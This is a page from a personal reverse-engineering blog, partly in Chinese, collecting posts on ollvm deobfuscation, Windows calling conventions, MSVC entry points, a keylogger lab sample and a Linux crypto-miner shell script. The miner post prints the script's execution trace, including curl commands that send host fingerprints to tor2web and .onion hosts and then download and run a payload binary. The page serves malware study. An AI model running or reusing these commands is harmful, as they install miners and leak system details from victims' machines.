<h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>First of all, I love oalabs. Below of code is copied from his research, and I get a lot from just repeat it. And maybe there are also bogus-control-flow in this sample however.</p>
<p>Sample: <code>5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b</code></p>
<p>Unpacked sample: <code>2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7</code> on the malshare(by the oalabs)</p>
<p><strong>References</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://synthesis.to/2021/03/03/flattening_detection.html">Control Flow Flattening</a></li>
<li><a target="_blank" rel="noopener" href="https://research.openanalysis.net/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/]https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html">Deobfuscation - Recovering an ollvm</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mrexodia/dumpulator">dumpulator</a></li>
<li><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/112">Control Flow Unflattening</a></li>
<li><a target="_blank" rel="noopener" href="https://malshare.com/sample.php?action=detail&hash=5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b">malshare</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=SulC2l1Dvbo&t=1s">oalabs</a></li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-13</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ollvm-dumpulator-ransomeware/" title="ollvm dumpulator ransomeware">ollvm dumpulator ransomeware </a><span class="leancloud_visitors"></span><span>About 3456 words, 11 min 31 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/07/calling-convention/">calling-convention</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Calling-Conventions"><a href="#Calling-Conventions" class="headerlink" title="Calling Conventions"></a>Calling Conventions</h1><p>There are different calling conventions for different operating systems <strong>or</strong> different bits of system<br><strong>or</strong> you compile with the vs (or others)</p>
<ul>
<li>Different conventions based on processor,OS,and Language Describe how are passed to functions</li>
<li>Describe how are returned from functions</li>
<li>Describe if the caller or callee <code>clean the stack</code></li>
<li>Resonsible for function and<code>prologue</code>and<code>epilogue</code></li>
</ul>
<h2 id="Windows-x86-Calling-Convention"><a href="#Windows-x86-Calling-Convention" class="headerlink" title="Windows x86 Calling Convention"></a>Windows x86 Calling Convention</h2><table>
<thead>
<tr>
<th align="left">Keyword</th>
<th align="left">Stack cleanup</th>
<th align="left">Parameter passing</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/cdecl?view=msvc-170">__cdecl</a></td>
<td align="left">Caller</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/clrcall?view=msvc-170">__clrcall</a></td>
<td align="left">n&#x2F;a</td>
<td align="left">Load parameters onto CLR expression stack in order (left to right).</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170">__stdcall</a></td>
<td align="left">Callee</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170">__fastcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/thiscall?view=msvc-170">__thiscall</a></td>
<td align="left">Callee</td>
<td align="left">Pushed on stack; <strong><code>this</code></strong> pointer stored in ECX</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/vectorcall?view=msvc-170">__vectorcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack in reverse order (right to left)</td>
</tr>
</tbody></table>
<ul>
<li>All arguments are widened to 32 bits(DWORD)</li>
<li>Return value is widened to 32 bits(DWORD)</li>
<li>Return values up to 32 bits are returned to <code>eax</code> register</li>
<li>Return values of 64 bit size(QWORD) are returned in EDX:EAX(The main value is in the EDX Register)</li>
<li>Return Structures are returned by reference with a pointer in EAX</li>
<li>Registers ESI,EDI,EBX,and EBP are restored(non-volatile)</li>
<li>MSDN is your friend</li>
</ul>
<h3 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a><code>__cdecl</code></h3><ul>
<li><p>Default calling convention for c and c++</p>
</li>
<li><p>Arguments are passed on the stack(pushed right-to-left)</p>
</li>
<li><p>Called is responsible for stack cleanup will (cdecl will clean the stack )</p>
<ul>
<li><p>this is important when there are variadic functions,so function doesn’t</p>
<p>worry about stack cleaning.</p>
</li>
</ul>
</li>
<li><p>Supports varag(variadic)functions</p>
</li>
</ul>
<p>Example code below:</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182649772.png" alt="image-20220407182649772"></p>
<p>then we can get follow code with ida</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182717320-20220407202633645-20220407202659160.png" alt="image-20220407182717320"></p>
<ul>
<li>sub_401090 is the hello1 function</li>
<li>sub_401000 is the addingNumberVariadic function which is variadic<ul>
<li>notice that caller clean the stack when the function return</li>
</ul>
</li>
</ul>
<h3 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h3><p>The <strong><code>__stdcall</code></strong> calling convention is used to call Win32 API functions. <code>The callee cleans the stack</code>, so the compiler makes <code>vararg</code> functions <strong><code>__cdecl</code></strong>. Functions that use this calling convention require a function prototype. The <strong><code>__stdcall</code></strong> modifier is Microsoft-specific.</p>
<table>
<thead>
<tr>
<th>Element</th>
<th>Implementation</th>
</tr>
</thead>
<tbody><tr>
<td>Argument-passing order</td>
<td>Right to left.</td>
</tr>
<tr>
<td>Argument-passing convention</td>
<td>By value, unless a pointer or reference type is passed.</td>
</tr>
<tr>
<td>Stack-maintenance responsibility</td>
<td>Called function pops its own arguments from the stack.</td>
</tr>
<tr>
<td>Name-decoration convention</td>
<td>An underscore (<code>_</code>) is prefixed to the name. The name is followed by the at sign (<code>@</code>) followed by the number of bytes (in decimal) in the argument list. Therefore, the function declared as <code>int func( int a, double b )</code> is decorated as follows: <code>_func@12</code></td>
</tr>
</tbody></table>
<h3 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h3><p>The <strong><code>__fastcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers, when possible. This calling convention only applies to the x86 architecture. The following list shows the implementation of this calling convention.</p>
<table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Implementation</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Argument-passing order</td>
<td align="left">The first two DWORD or smaller arguments that are found in the argument list from left to right are passed in ECX and EDX registers; all other arguments are passed on the stack from right to left.</td>
</tr>
<tr>
<td align="left">Stack-maintenance responsibility</td>
<td align="left">Called function pops the arguments from the stack.</td>
</tr>
<tr>
<td align="left">Name-decoration convention</td>
<td align="left">At sign (@) is prefixed to names; an at sign followed by the number of bytes (in decimal) in the parameter list is suffixed to names.</td>
</tr>
<tr>
<td align="left">Case-translation convention</td>
<td align="left">No case translation performed.</td>
</tr>
</tbody></table>
<h3 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h3><p>The <strong>Microsoft-specific</strong> <strong><code>__thiscall</code></strong> calling convention is used on C++ class member functions on the x86 architecture. It’s the default calling convention used by member functions that don’t use variable arguments (<code>vararg</code> functions).</p>
<p>Under __thiscall, <code>the callee cleans the stack</code>, which is impossible for <code>vararg functions</code>. Arguments are pushed on the stack from right to left. <u>The <strong><code>this</code></strong> pointer is passed via register ECX, and not on the stack</u>.</p>
<blockquote>
<p><code>vararg</code> member functions use the <strong><code>__cdecl</code></strong> calling convention. All function arguments are pushed on the stack, with the <strong><code>this</code></strong> pointer placed on the stack last.</p>
</blockquote>
<p>Because this calling convention applies only to C++, it doesn’t have a C name decoration scheme.</p>
<p>When you define a non-static class member function out-of-line, specify the calling convention modifier only in the declaration. You don’t have to specify it again on the out-of-line definition. The compiler uses the calling convention specified during declaration at the point of definition.</p>
<h3 id="vectorcall"><a href="#vectorcall" class="headerlink" title="__vectorcall"></a>__vectorcall</h3><p>The <strong><code>__vectorcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers. <strong><code>__vectorcall</code></strong> uses more registers for arguments than <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170"><code>__fastcall</code></a> or the default <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling convention</a>(rcx rdx r7 r8 [rsp+[size of arg]) use. The <strong><code>__vectorcall</code></strong> calling convention is only supported in native code on x86 and x64 processors that<u>  include Streaming SIMD Extensions 2 (SSE2) and above.</u> Use <strong><code>__vectorcall</code></strong> to speed functions that pass several floating-point or SIMD vector arguments and perform operations that take advantage of the arguments loaded in registers. The following list shows the features that are common to the x86 and x64 implementations of <strong><code>__vectorcall</code></strong>. The differences are explained later in this article.</p>
<blockquote>
<p>to be continue one day</p>
</blockquote>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-07</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 834 words, 2 min 46 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/04/oep-tricks/">oep_tricks</a></h3></div><div class="post-content"><div class="card"><p><h1 id="OEP-tricks"><a href="#OEP-tricks" class="headerlink" title="OEP tricks"></a>OEP tricks</h1><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>Why is the PE Entry Point Not the same as Main Understanding <code>__security__init__cookie</code>and<code>scrt_common_main_seh</code></p>
<p>在第一次学习如何对 Windows 二进制文件进行逆向工程时，尤其是在使用调试器时，这是一个需要理解的重要概念。 当调试器在 PE 入口点上中断时，通常会让人感到困惑，只是为了找到一些与二进制文件的主要功能无关的代码。 此代码通常称为<code>boilerplate</code>代码，由 MSVC 编译器自动插入。 这对我们识别代码和方向有很大帮助。</p>
<h3 id="MSVC-console-Application-Entry-point"><a href="#MSVC-console-Application-Entry-point" class="headerlink" title="MSVC console Application Entry point"></a>MSVC console Application Entry point</h3><p>The Entry Point on an MSVC console application servers two purples .</p>
<ul>
<li>calls the <code>__security__init_cookie</code> function </li>
<li>jumps to the <code>__scrt_common_main_seh</code>thunk<ul>
<li>The __scrt_common_main_seh thunk then performs some setup for the binary including some structured exception handler (SEH) setup and then calls  main.</li>
</ul>
</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403215142052.png" alt="image-20220403215142052"></p>
<h3 id="security-init-cookie"><a href="#security-init-cookie" class="headerlink" title="__security_init_cookie"></a>__security_init_cookie</h3><blockquote>
<p>The purpose of this cookie is best described by <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/security-init-cookie?view=msvc-170">MSDN</a></p>
<p>全局安全 cookie 用于在使用 &#x2F;GS（缓冲区安全检查）编译的代码和使用异常处理的代码中进行缓冲区溢出保护。</p>
<p>在进入受溢出保护的函数时，cookie 被放入堆栈，而在退出时，堆栈上的值与全局 cookie 进行比较。 它们之间的任何差异都表明发生了缓冲区溢出并导致程序立即终止。</p>
</blockquote>
<p>Normally, <strong><code>__security_init_cookie</code></strong> is called by the CRT when it’s initialized. If you bypass CRT initialization—for example, if you use <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/reference/entry-entry-point-symbol?view=msvc-170"><code>/ENTRY</code></a> to specify an entry-point—then you must call </p>
<p><strong><code>__security_init_cookie</code></strong> yourself. If <strong><code>__security_init_cookie</code></strong> isn’t called, the global security cookie is set to a default value and  buffer overrun protection is compromised. Because an attacker can  exploit this default cookie value to defeat the buffer overrun checks,  we recommend that you always call </p>
<p><strong><code>__security_init_cookie</code></strong> when you define your own entry point.</p>
<blockquote>
<p>we can use the opcode <code>48 89 5C 24 20 55 48 8B EC 48 83 EC 20</code> to find the <code>__security_init_cookie</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403230636976.png" alt="image-20220403230636976"></p>
</blockquote>
<p>The call to <strong><code>__security_init_cookie</code></strong> must be made before any overrun-protected function is entered; otherwise a  spurious buffer overrun will be detected. For more information, see <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/error-messages/tool-errors/c-runtime-error-r6035?view=msvc-170">C Runtime Error R6035</a>.</p>
<h3 id="scrt-common-main-seh"><a href="#scrt-common-main-seh" class="headerlink" title="__scrt_common_main_seh"></a>__scrt_common_main_seh</h3><p>Looking at this code without labels (for example in x64dbg) it can be confusing to identify where main is. Luckily MSVC console applications all have the same main function prototype.</p>
<blockquote>
<p>*main(int argc, const char **argv, const char *<em>envp)</em></p>
</blockquote>
<p>This function prototype can be used to identify the call to main in __scrt_common_main_seh, simply by looking for the three arguments that are passed to main: <em>argc</em>, <em>argv</em>, <em>envp</em>.</p>
<ul>
<li><p>In 64-bit binaries these arguments are compiled into a series of three <em>mov</em> instructions moving the arguments into the registers <code>RCX, RDX, R8</code></p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225145892.png" alt="image-20220403225145892"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4C 8B C7                mov     r8, rdi         ; envp</span><br><span class="line">48 8B D3                mov     rdx, rbx        ; argv</span><br><span class="line">8B 08                   mov     ecx, [rax]      ; argc</span><br></pre></td></tr></table></figure>

</li>
<li><p>In 32-bit binaries these arguments are compiled into a series of three <em>push</em> instructions pushing the arguments onto the stack.</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225150632.png" alt="image-20220403225150632"></p>
</li>
</ul>
<blockquote>
<p>！！！！！！These patterns can be relied on to identify main. ！！！！！！！</p>
</blockquote>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/msvc/" title="msvc">msvc </a><span class="leancloud_visitors"></span><span>About 637 words, 2 min 7 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/01/keylog/">keylog</a></h3></div><div class="post-content"><div class="card"><p><blockquote>
<p>样本来源：lab03-03</p>
<p>md5: e2bf42217a67e46433da8b6f4507219e</p>
</blockquote>
<p>动态解密资源里的PE后得到了keylog的代码部分。这里不写。</p>
<h2 id="keylog-Analysis"><a href="#keylog-Analysis" class="headerlink" title="keylog Analysis"></a>keylog Analysis</h2><p>通过伪代码我可以很清楚得看到keylog的几步</p>
<ul>
<li>FindWindowA</li>
<li>ShowWindow</li>
<li>GetModuleHandleA</li>
<li>SetWindowHookExA</li>
<li>unhookWindowsHookEx</li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-01</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 952 words, 3 min 10 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/29/malware/"></a></h3></div><div class="post-content"><div class="card"><p><h1 id="mining-Virus-Analysis"><a href="#mining-Virus-Analysis" class="headerlink" title="mining Virus Analysis"></a>mining Virus Analysis</h1><p>md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee</p>
<p>filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>sh文件，简单易懂的base64混淆</p>
<p><img src="/malware.assets/image-20220329175059573.png" alt="image-20220329175059573"></p>
<p>解密后得到脚本step-2</p>
<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><ol>
<li><p><code>exec &amp;&gt;/dev/null</code>不允许输出</p>
</li>
<li><p><code>export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</code>设置环境变量</p>
</li>
<li><p>&#96;&#96;&#96;<br>┌──(kali㉿kali)-[~]<br>└─$ grep x:$(id -u): &#x2F;etc&#x2F;passwd|cut -d: -f6<br>&#x2F;home&#x2F;kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. curl参数设置，这边curl携带的参数为`curl -4fsSLkA- -m200`</span><br><span class="line"></span><br><span class="line">   `-4`(`--ipv4` Resolve names to IPv4 addresses)</span><br><span class="line"></span><br><span class="line">   `--fail`,`--silent`,`--show-error`(Show error even when -s is used),</span><br><span class="line"></span><br><span class="line">   `-L`(`--location` follow the direction)</span><br><span class="line"></span><br><span class="line">   `-k`(`--insecure` Allow insecure server connections),</span><br><span class="line"></span><br><span class="line">   `-A`(`--user-agent &lt;name&gt;`Send User-Agent &lt;name&gt; to server)</span><br><span class="line"></span><br><span class="line">    `-m`(`--max-time` &lt;fractional seconds&gt; Maximum time allowed for transfer)</span><br><span class="line"></span><br><span class="line">5. 设置了三个函数`u`,`sockz`,`fexe`，太多了，不想看了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">暴力解决sh，我们得到如下执行顺序</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games:&#x2F;home&#x2F;kali:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin</li>
<li>PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games:&#x2F;home&#x2F;kali:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin</li>
</ul>
<p>++ cut -d: -f6<br>+++ id -u<br>++ grep x:1000: &#x2F;etc&#x2F;passwd</p>
<ul>
<li>d&#x3D;&#x2F;home&#x2F;kali</li>
</ul>
<p>++ echo ‘curl -4fsSLkA- -m200’</p>
<ul>
<li>c&#x3D;’curl -4fsSLkA- -m200’</li>
</ul>
<p>++ echo 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad</p>
<ul>
<li>t&#x3D;5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad</li>
<li>for h in tor2web.in tor2web.it</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01<br>head: cannot open ‘&#x2F;tmp&#x2F;.X11-unix&#x2F;01’ for reading: No such file or directory</p>
<ul>
<li>ls &#x2F;proc&#x2F;&#x2F;status<br>ls: cannot access ‘&#x2F;proc&#x2F;&#x2F;status’: No such file or directory</li>
<li>fexe</li>
<li>for i in . $HOME &#x2F;usr&#x2F;bin $d &#x2F;var&#x2F;tmp</li>
<li>echo exit</li>
<li>chmod +x .&#x2F;i</li>
<li>cd .</li>
<li>.&#x2F;i</li>
<li>break</li>
<li>u 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in</li>
<li>sockz</li>
<li>n&#x3D;(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</li>
</ul>
<p>++ echo ‘dns-query?name&#x3D;relay.tor2socks.in’</p>
<ul>
<li>p&#x3D;’dns-query?name&#x3D;relay.tor2socks.in’</li>
</ul>
<p>++ grep -oE ‘\b([0-9]{1,3}.){3}[0-9]{1,3}\b’<br>++ curl -4fsSLkA- -m200 ‘<a target="_blank" rel="noopener" href="https://doh.li/dns-query?name=relay.tor2socks.in&#39;">https://doh.li/dns-query?name=relay.tor2socks.in&#39;</a><br>++ grep -Ev ‘[.]0’<br>++ tr ‘ ‘ ‘\n’<br>++ sort -uR<br>++ head -n 1<br>curl: (35) OpenSSL SSL_connect: Connection reset by peer in connection to doh.li:443 </p>
<ul>
<li>s&#x3D;</li>
</ul>
<p>++ uname -m</p>
<ul>
<li>f&#x3D;&#x2F;int.x86_64</li>
</ul>
<p>++ date<br>++ md5sum<br>++ cut -f1 -d-</p>
<ul>
<li>x&#x3D;’.&#x2F;90aab6fe6a62477d35a888699d973c67  ‘</li>
</ul>
<p>++ curl -4fsSLk checkip.amazonaws.com<br>++ whoami<br>++ uname -m<br>++ uname -n<br>++ ip a<br>++ grep ‘inet ‘<br>++ awk ‘{print $2}’<br>++ awk ‘{print $1}’<br>++ md5sum<br>++ base64 -w0<br>++ crontab -l<br>no crontab for kali</p>
<ul>
<li>r&#x3D;xx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>curl -4fsSLkA- -m200 -x socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_<br>curl: (5) Unsupported proxy syntax in ‘socks5h:&#x2F;&#x2F;:9050’</li>
<li>curl -4fsSLkA- -m200 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>echo .socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_<br>.socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>chmod +x .&#x2F;90aab6fe6a62477d35a888699d973c67</li>
<li>.&#x2F;90aab6fe6a62477d35a888699d973c67</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
<li>for h in tor2web.in tor2web.it</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
<li>break<br>&#96;&#96;&#96;</li>
</ul>
<p>部分命令需要提权，linux病毒分析这块没学过，后面肯定不跟下去了。以后有机会再分析。</p>
<p><img src="/malware.assets/image-20220329185108458.png" alt="image-20220329185108458"></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-29</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 1107 words, 3 min 41 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/29/mining-sh-analysis/">mining-sh-analysis</a></h3></div><div class="post-content"><div class="card"><p><h1 id="mining-Virus-Analysis"><a href="#mining-Virus-Analysis" class="headerlink" title="mining Virus Analysis"></a>mining Virus Analysis</h1><p>md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee</p>
<p>filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6</p></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/linux/" title="linux">linux </a><span class="leancloud_visitors"></span><span>About 1107 words, 3 min 41 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/23/about/">about</a></h3></div><div class="post-content"><div class="card"><p></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-23</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 0 words, 0 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>